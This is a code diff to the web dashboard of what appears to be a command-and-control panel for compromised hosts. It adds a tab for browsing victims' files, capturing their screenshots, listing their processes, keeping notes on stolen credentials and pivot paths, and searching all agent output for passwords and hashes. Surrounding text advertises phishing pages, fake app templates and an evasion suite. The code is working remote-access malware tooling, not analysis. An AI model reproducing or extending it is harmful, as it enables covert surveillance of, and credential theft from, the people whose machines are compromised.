@@ -284,6 +284,7 @@ tr.clickable { cursor: pointer; }
     <div class="tab" onclick="nav('tasks')">Tasks</div>
     <div class="tab" onclick="nav('terminal')">Terminal</div>
     <div class="tab" onclick="nav('payloads')">Payloads</div>
+    <div class="tab" onclick="nav('files')">Files</div>
     <div class="tab" onclick="nav('events')">Events</div>
   </div>
   <div class="topbar-right">
@@ -304,6 +305,7 @@ tr.clickable { cursor: pointer; }
     <div class="sidebar-divider"></div>
     <button class="sidebar-btn" onclick="nav('terminal')" title="Terminal">💻</button>
     <button class="sidebar-btn" onclick="nav('payloads')" title="Payloads">🔧</button>
+    <button class="sidebar-btn" onclick="nav('files')" title="Files / Screenshots / Processes">📂</button>
     <div class="sidebar-divider"></div>
     <button class="sidebar-btn" onclick="nav('events')" title="Events">📜</button>
   </div>
@@ -551,6 +553,100 @@ tr.clickable { cursor: pointer; }
               <h4 style="color:var(--accent-light);font-size:12px;margin-bottom:6px;">MOBILE PAYLOADS</h4>
               <p style="font-size:12px;color:var(--text-muted);">Android APK projects with evasion suite. iOS MDM profiles and phishing pages. 30+ fake app templates.</p>
             </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ══════ FILES / SCREENSHOTS / PROCESSES ══════ -->
+    <div id="p-files" class="page">
+
+      <!-- Agent selector -->
+      <div style="display:flex;gap:12px;align-items:center;margin-bottom:16px;">
+        <span style="color:var(--text-muted);font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:1px;">Target Agent</span>
+        <div class="select-wrap">
+          <select id="fb-agent" style="width:100%;padding:10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;min-width:220px;">
+            <option value="">Select an agent...</option>
+          </select>
+        </div>
+      </div>
+
+      <!-- Three panels side by side -->
+      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;margin-bottom:16px;">
+
+        <!-- File Browser -->
+        <div class="card">
+          <div class="card-header"><h3><span>📂</span> File Browser</h3></div>
+          <div class="card-body padded">
+            <div style="display:flex;gap:8px;margin-bottom:12px;">
+              <input type="text" id="fb-path" placeholder="/ or C:\\" style="flex:1;padding:8px 12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace;">
+              <button class="btn" onclick="browseFiles()" style="padding:8px 14px;font-size:12px;">Browse</button>
+            </div>
+            <div class="quick-actions" style="margin-bottom:10px;">
+              <button class="qbtn" onclick="browseDir('/')">/ (root)</button>
+              <button class="qbtn" onclick="browseDir('/home')">home</button>
+              <button class="qbtn" onclick="browseDir('/etc')">etc</button>
+              <button class="qbtn" onclick="browseDir('/tmp')">tmp</button>
+              <button class="qbtn" onclick="browseDir('C:\\\\Users')">C:\\Users</button>
+              <button class="qbtn" onclick="browseDir('C:\\\\Windows')">C:\\Windows</button>
+            </div>
+            <div id="fb-output" style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:12px;min-height:200px;max-height:350px;overflow-y:auto;font-family:monospace;font-size:12px;color:var(--text-muted);white-space:pre-wrap;">
+              Select an agent and path, then click Browse.
+            </div>
+          </div>
+        </div>
+
+        <!-- Screenshot -->
+        <div class="card">
+          <div class="card-header"><h3><span>📸</span> Screenshot</h3></div>
+          <div class="card-body padded">
+            <button class="btn" onclick="requestScreenshot()" style="width:100%;padding:10px;font-size:13px;margin-bottom:12px;">📸 Capture Screenshot</button>
+            <div id="ss-output" style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:12px;min-height:200px;display:flex;align-items:center;justify-content:center;">
+              <div style="text-align:center;color:var(--text-muted);">
+                <div style="font-size:40px;opacity:0.3;margin-bottom:8px;">📸</div>
+                <p style="font-size:12px;">Click capture to request a screenshot from the agent.</p>
+                <p style="font-size:11px;margin-top:4px;">Results appear in the agent's task history.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Process List -->
+        <div class="card">
+          <div class="card-header"><h3><span>⚙️</span> Process List</h3></div>
+          <div class="card-body padded">
+            <button class="btn" onclick="requestProcessList()" style="width:100%;padding:10px;font-size:13px;margin-bottom:12px;">⚙️ List Processes</button>
+            <div id="ps-output" style="background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);padding:12px;min-height:200px;max-height:350px;overflow-y:auto;font-family:monospace;font-size:11px;color:var(--text-muted);white-space:pre-wrap;">
+              Click to request the running process list from the agent.
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Agent Notes -->
+      <div class="card">
+        <div class="card-header"><h3><span>📝</span> Agent Notes</h3></div>
+        <div class="card-body padded">
+          <div style="display:flex;gap:8px;margin-bottom:12px;">
+            <input type="text" id="note-input" placeholder="Add a note (creds, findings, pivot info...)" style="flex:1;padding:10px 14px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;" onkeydown="if(event.key==='Enter')addNote()">
+            <button class="btn" onclick="addNote()" style="padding:10px 16px;">Add Note</button>
+          </div>
+          <div id="notes-list" style="max-height:200px;overflow-y:auto;">
+            <div style="color:var(--text-muted);font-size:12px;padding:8px;">Select an agent to view notes.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Search Output -->
+      <div class="card">
+        <div class="card-header"><h3><span>🔍</span> Search Task Output</h3></div>
+        <div class="card-body padded">
+          <div style="display:flex;gap:8px;margin-bottom:12px;">
+            <input type="text" id="search-input" placeholder="Search across all agent output (passwords, hashes, configs...)" style="flex:1;padding:10px 14px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;" onkeydown="if(event.key==='Enter')searchOutput()">
+            <button class="btn" onclick="searchOutput()" style="padding:10px 16px;">Search</button>
+          </div>
+          <div id="search-results" style="max-height:300px;overflow-y:auto;">
+            <div style="color:var(--text-muted);font-size:12px;padding:8px;">Search results will appear here.</div>
           </div>
         </div>
       </div>
@@ -1047,7 +1143,160 @@ refreshAll = async function() {
   drawOSChart(agents);
   drawNetworkGraph(agents);
   updateSessionHealth(agents);
+  updateFBAgentSelector(agents);
 };
+
+// ──── Files / Screenshot / Process / Notes / Search ────
+
+function getSelectedFBAgent() {
+  const sel = document.getElementById('fb-agent');
+  if (!sel.value) { alert('Select an agent first'); return null; }
+  return sel.value;
+}
+
+async function browseFiles() {
+  const agent = getSelectedFBAgent(); if (!agent) return;
+  const path = document.getElementById('fb-path').value || '/';
+  const output = document.getElementById('fb-output');
+  output.textContent = 'Requesting directory listing...';
+
+  try {
+    const resp = await fetch('/api/filebrowser?agent='+encodeURIComponent(agent)+'&path='+encodeURIComponent(path));
+    const data = await resp.json();
+    if (data.error) { output.textContent = 'Error: ' + data.error; return; }
+    output.innerHTML = '<span style="color:var(--green)">Task queued (ID: '+data.task_id.substring(0,8)+')</span>\n\nWaiting for agent check-in...\nResults will appear in the agent detail / terminal.';
+
+    // Poll for result
+    for (let i = 0; i < 20; i++) {
+      await new Promise(r => setTimeout(r, 3000));
+      const detail = await fetchJ('/api/agent/' + agent);
+      if (detail.tasks && detail.tasks.length > 0) {
+        const task = detail.tasks.find(t => data.task_id.startsWith(t.id));
+        if (task && task.output && task.status !== 'pending' && task.status !== 'sent') {
+          output.innerHTML = '<span style="color:var(--green)">$ ls -la ' + path + '</span>\n\n' + task.output;
+          return;
+        }
+      }
+    }
+    output.innerHTML += '\n\nTimeout - check agent tasks.';
+  } catch(e) { output.textContent = 'Error: ' + e.message; }
+}
+
+function browseDir(path) {
+  document.getElementById('fb-path').value = path;
+  browseFiles();
+}
+
+async function requestScreenshot() {
+  const agent = getSelectedFBAgent(); if (!agent) return;
+  const output = document.getElementById('ss-output');
+  output.innerHTML = '<div style="text-align:center;color:var(--accent-light);padding:20px;">📸 Screenshot requested...<br><br>Waiting for agent check-in.<br>Result will appear in agent task history.</div>';
+
+  try {
+    const resp = await fetch('/api/screenshot?agent='+encodeURIComponent(agent));
+    const data = await resp.json();
+    if (data.error) { output.innerHTML = '<div style="color:var(--red);padding:20px;">'+data.error+'</div>'; return; }
+    output.innerHTML = '<div style="text-align:center;padding:20px;"><div style="color:var(--green);margin-bottom:8px;">Screenshot task queued</div><div style="color:var(--text-muted);font-size:12px;">ID: '+data.task_id.substring(0,8)+'<br>Check agent detail for the captured image.</div></div>';
+  } catch(e) { output.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
+}
+
+async function requestProcessList() {
+  const agent = getSelectedFBAgent(); if (!agent) return;
+  const output = document.getElementById('ps-output');
+  output.textContent = 'Requesting process list...';
+
+  try {
+    const resp = await fetch('/api/processlist?agent='+encodeURIComponent(agent));
+    const data = await resp.json();
+    if (data.error) { output.textContent = 'Error: ' + data.error; return; }
+    output.innerHTML = '<span style="color:var(--green)">Task queued (ID: '+data.task_id.substring(0,8)+')</span>\n\nWaiting for agent...';
+
+    for (let i = 0; i < 20; i++) {
+      await new Promise(r => setTimeout(r, 3000));
+      const detail = await fetchJ('/api/agent/' + agent);
+      if (detail.tasks && detail.tasks.length > 0) {
+        const task = detail.tasks.find(t => data.task_id.startsWith(t.id));
+        if (task && task.output && task.status !== 'pending' && task.status !== 'sent') {
+          output.innerHTML = '<span style="color:var(--green)">$ ps aux</span>\n\n' + task.output;
+          return;
+        }
+      }
+    }
+    output.innerHTML += '\n\nTimeout - check agent tasks.';
+  } catch(e) { output.textContent = 'Error: ' + e.message; }
+}
+
+async function addNote() {
+  const agent = getSelectedFBAgent(); if (!agent) return;
+  const input = document.getElementById('note-input');
+  const text = input.value.trim();
+  if (!text) return;
+
+  await fetch('/api/notes?agent='+encodeURIComponent(agent), {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({text: text})
+  });
+  input.value = '';
+  loadNotes(agent);
+}
+
+async function loadNotes(agent) {
+  const list = document.getElementById('notes-list');
+  try {
+    const notes = await fetchJ('/api/notes?agent='+encodeURIComponent(agent));
+    if (!notes || notes.length === 0) {
+      list.innerHTML = '<div style="color:var(--text-muted);font-size:12px;padding:8px;">No notes yet.</div>';
+      return;
+    }
+    list.innerHTML = notes.map(n =>
+      '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;margin-bottom:6px;">'+
+      '<div style="display:flex;justify-content:space-between;font-size:11px;color:var(--text-muted);margin-bottom:4px;">'+
+      '<span style="color:var(--accent-light);font-weight:600;">'+n.author+'</span>'+
+      '<span>'+n.timestamp+'</span></div>'+
+      '<div style="font-size:13px;">'+n.text+'</div></div>'
+    ).join('');
+  } catch(e) { list.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
+}
+
+async function searchOutput() {
+  const query = document.getElementById('search-input').value.trim();
+  if (!query) return;
+  const results = document.getElementById('search-results');
+  results.innerHTML = '<div style="color:var(--text-muted);padding:8px;">Searching...</div>';
+
+  try {
+    const data = await fetchJ('/api/search?q='+encodeURIComponent(query));
+    if (!data || data.length === 0) {
+      results.innerHTML = '<div style="color:var(--text-muted);padding:8px;">No results found for "'+query+'"</div>';
+      return;
+    }
+    results.innerHTML = data.map(r =>
+      '<div style="background:var(--bg-input);border:1px solid var(--border);border-radius:6px;padding:10px;margin-bottom:6px;">'+
+      '<div style="display:flex;justify-content:space-between;font-size:11px;margin-bottom:4px;">'+
+      '<span style="color:var(--accent-light);font-weight:600;">'+r.agent+'</span>'+
+      '<span style="color:var(--text-muted);">'+r.type+' | '+r.time+'</span></div>'+
+      '<div style="font-size:12px;color:var(--cyan);margin-bottom:4px;font-family:monospace;">$ '+r.command+'</div>'+
+      '<div style="font-size:12px;font-family:monospace;color:var(--text-primary);max-height:100px;overflow-y:auto;white-space:pre-wrap;">'+r.output+'</div></div>'
+    ).join('');
+  } catch(e) { results.innerHTML = '<div style="color:var(--red);">'+e.message+'</div>'; }
+}
+
+// Update file browser agent selector on refresh
+function updateFBAgentSelector(agents) {
+  const sel = document.getElementById('fb-agent');
+  if (!sel) return;
+  const cur = sel.value;
+  sel.innerHTML = '<option value="">Select an agent...</option>' + agents.map(a =>
+    '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+a.name+' ('+a.os+' / '+a.hostname+')</option>'
+  ).join('');
+
+  // Load notes if agent selected
+  if (sel.value) loadNotes(sel.value);
+}
+
+document.getElementById('fb-agent').addEventListener('change', function() {
+  if (this.value) loadNotes(this.value);
+});
 
 // ──── Payload Generator ────
 function onPayloadTypeChange() {
